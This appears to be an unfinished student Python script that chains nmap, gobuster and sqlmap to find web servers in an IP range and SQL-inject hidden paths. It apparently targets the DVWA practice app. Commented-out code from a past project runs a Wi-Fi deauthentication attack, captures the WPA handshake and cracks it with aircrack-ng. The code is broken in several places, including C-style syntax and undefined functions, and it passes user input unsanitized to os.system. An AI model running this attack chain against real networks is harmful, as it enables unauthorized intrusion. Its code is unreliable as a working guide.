#!/usr/bin/env python

'''
The purpose of our tool is to automate web application reconnaissance and SQL Injection.
This tool will test if any hidden paths of the web application is vulnerable to SQL injection.
 Our proposed tool would
 1) ping the desired network range for live hosts,
 2) scan for ports 80, 443 for web servers,
 3) use Dirbuster to show any hidden files and directories,
 4) try to perform SQLMap on those hidden web pages if they contain forms or any kind of user input.


1.) Sqler [range]
    - Nmap the range and scan for ports 80, 443
    - Return a list of webservers
    - Ask which one you want to proceed
    - Input: “dvwa.com ip address”
    https://medium.com/@TheShredder/create-your-ethical-hacking-environment-install-dvwa-into-your-kali-linux-4783282dea6a
    https://www.yeahhub.com/install-dvwa-kali-linux/
2.) Use gobuster
    - Get the data back somehow?????
    - Run gobuster -o <file> – specify a file name to write the output to.
3.) Perform sqlmap on those paths in that output file from step 2
    - Login page
            -Use sqlmap on forms
    - Id parameter inside the url

CODE BELOW IS AN EXAMPLE OF A PAST PROJECT TO GIVE US STRUCTURE FOR UTILIZING
COMMAND LINE.
'''

import os
#import subprocess
#from time import sleep

if os.geteuid() != 0:
    print("\nYou must run this script as a root user.\n")

    # should delete following reponse/if statement later
    response = input("Continue anyway for script testing purposes? y/n ")
    if response != "y":
        exit(0)

def nmap_scan():
    ip_addr = input("Type in the IP range you would like to scan: ")
    cmd = "nmap -n --open " + ip_addr + " -p80,443"
    try:
        os.system(cmd)
        #we should probably parse nmap output to see if there were zero hosts that were found
        #if no hosts were found, give the option to run nmap scan again.

        #cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        #int_name = str(os.popen(cmd).read()).strip('\n')
        #return int_name
    except KeyboardInterrupt:
        print ("nmap scan failed. Run script again.")
    
    #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
    webserver = input("Webserver to attack: ")
    return webserver

def gobuster(webserver):
    #maybe os.mkdir for a new gobuster output folder to make it sexier?
    #create standard file for gobust output?
    #instead of hardcoding ask user to write path to pw cracking file?????
    cmd = "gobuster -o gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("Gobuster failed. Run script again")

def sqlmap_options_output():
    options = ["id parameter", "option page"]
    print("Which option would you like to use in SQLMap? Please type the corresponding type number\n")
    int counter = 1
    for option in options:
        print(counter + option + "\n")
        counter++

def sqlmap(webserver):
    injection_options = ["?id=1", "NOT available"]
    hidden_path = input("What hidden path would you like to SQL inject? ")
    inject_options_output()
    option_chosen = input()
    cmd = "sqlmap -u " + webserver + hidden_path + injection_options[option_chosen - 1]
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("Gobuster failed. Run script again")


'''
def network_teardown(int_name):
    try:
        os.system("airmon-ng stop %s" %int_name)
        os.system("service network-manager restart")
    except NameError:
        print("Network Interface \"%s\" does not exist" %int_name)

def network_sniff(interface_name):
    try:
        os.system("airodump-ng -a -w testcap %s" %interface_name)
    except KeyboardInterrupt:
        print ("Network Sniffing Ended")

def deauth_bomb(int_name, number_deauth_packets):
    try:
        ssid_name = str(raw_input("What are the first 3 letters of the ssid you want to target? (Case Sensitive) "))

        cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
        bssid = str(os.popen(cmd).read()).strip('\n')

        cmd = "cat testcap-01.csv | grep " + bssid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'"
        channel = str(os.popen(cmd).read()).split('\n')[0]

        cmd = "iwconfig " + int_name + " channel " + channel
        os.system(cmd)

        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
        subprocess.call(cmd, shell=True)
        return bssid, channel

    except KeyboardInterrupt:
        return bssid
'''
if __name__ == "__main__":
     # ASCII art for tool name? Option to show user instructions and purpose of project?
    webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
    gobuster(webserver)
    sqlmap(webserver)
    


'''
    os.system("rm testcap*")
    os.system("rm captured*")
    display_ascii_logo()
    display_ascii_bomb()
    os.system("iwconfig")

    interface_name = raw_input("What is the name of your wireless interface? ")

    print ("\nSetting up Nic Parameters")
    int_name = network_setup(interface_name)

    print ("\nsniffing network, press CTRL+C when you see a network you want to target")
    network_sniff(int_name)

    print ("\nWith user input, sending De-Auth bomb")
    bssid, channel = deauth_bomb(int_name, number_deauth_packets)

    print ("Capturing 4-way handshake, targeting " + str(bssid))
    capture_handshake(bssid, int_name, channel)

    print("\nResetting Nic Parameters and restarting Network-Manager.\n")
    network_teardown(int_name)

    cmd = "aircrack-ng -w /usr/share/john/password.lst -b " + bssid + " captured_packet-01.cap"
    subprocess.call(cmd, shell=True)
'''
